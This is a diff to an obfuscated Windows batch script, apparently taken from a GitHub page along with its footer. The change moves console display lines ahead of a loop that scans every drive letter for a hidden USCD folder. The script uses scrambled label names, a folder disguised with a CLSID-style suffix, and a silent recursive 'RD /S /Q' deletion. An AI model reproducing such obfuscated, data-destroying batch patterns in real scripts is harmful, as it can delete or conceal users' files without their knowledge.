@@ -44,8 +44,15 @@ GOTO QX0MN6J
             CLS 
 	    SET Q01=A
 	    SET MWQ273FXCX=USCD\COREX\NPQ-*-*-*-*.RESCqSID
-	    :XS7YAERDS
 	    CLS
+	    TITLE %qp_7%
+	    ECHO. 
+  	    ECHO. 
+            ECHO. 
+            ECHO ______________________________ 
+            ECHO          %qp_8%
+            ECHO ______________________________ 
+	    :XS7YAERDS
             IF NOT EXIST %Q01%:\%MWQ273FXCX% SET Q01=B
             IF NOT EXIST %Q01%:\%MWQ273FXCX% SET Q01=C
             IF NOT EXIST %Q01%:\%MWQ273FXCX% SET Q01=D
@@ -72,13 +79,6 @@ GOTO QX0MN6J
             IF NOT EXIST %Q01%:\%MWQ273FXCX% SET Q01=Y
             IF NOT EXIST %Q01%:\%MWQ273FXCX% SET Q01=Z
             IF     EXIST %Q01%:\%MWQ273FXCX%                            GOTO  SAXTASEWE33
-            TITLE %qp_7%
-	    ECHO. 
-  	    ECHO. 
-            ECHO. 
-            ECHO ______________________________ 
-            ECHO          %qp_8%
-            ECHO ______________________________ 
 	    PING LOCALHOST -n 2 >nul &GOTO XS7YAERDS
                 :LKXUEH73TX
 		IF EXIST "COSE.MICRO.LOXSERO.{00021401-0000-0000-C000-000000000046}\uuu\us\NPSWR.CZXNQ" GOTO OXUE8DUR
@@ -408,3 +408,15 @@ GOTO KSURHC63H
 		PING LOCALHOS -N 2 >nul &GOTO JJCUD7DGX6
                 IF %USHE37UD%==K RD /S /Q %nxs%:\USCD
                 GOTO QX0MN6J
+© 2020 GitHub, Inc.
+Terms
+Privacy
+Security
+Status
+Help
+Contact GitHub
+Pricing
+API
+Training
+Blog
+About
